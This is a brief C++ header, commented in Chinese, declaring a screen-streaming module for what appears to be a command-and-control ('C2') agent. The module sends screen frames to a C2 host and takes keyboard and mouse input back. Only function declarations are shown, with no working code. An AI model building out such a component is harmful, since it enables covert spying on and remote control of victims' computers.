// screen_stream.h — 屏幕流长连接（协议 §9）：帧上行 + 输入下行
#pragma once

#include <cstdint>
#include <string>

namespace c2 {

struct AgentConfig;

// 设置屏幕流所需的连接配置（C2 地址 + agent 配置），main 启动时调用一次。
void screen_stream_set_config(const std::string& host, const AgentConfig& cfg);

// 启动/停止屏幕流（独立线程运行：握手 → 帧循环 + 收输入事件）。
// fps 帧率上限；quality JPEG 质量(1-100)。
bool start_screen_stream(int fps, int quality, float scale = 1.0f);
void stop_screen_stream();

}  // namespace c2
